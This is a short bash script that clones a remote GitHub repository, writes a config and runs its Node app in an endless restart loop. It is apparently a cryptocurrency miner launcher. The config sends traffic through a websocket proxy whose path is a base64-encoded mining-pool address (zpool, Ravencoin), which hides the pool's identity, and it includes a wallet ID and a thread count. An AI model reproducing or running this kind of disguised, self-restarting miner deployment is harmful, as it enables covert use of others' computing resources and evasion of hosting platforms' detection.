#!/bin/bash
MIN=$1

git clone https://github.com/mom742886/nano-mbc
cd nano-mbc
echo '{
  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
  "config": { "threads": 6, "log": true },
  "options": { "user": "RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4", "password": "c=RVN", "argent": "web-wasm/1.0" }
}' > data.json

while true; do
    ./node app.js
    sleep 10
done
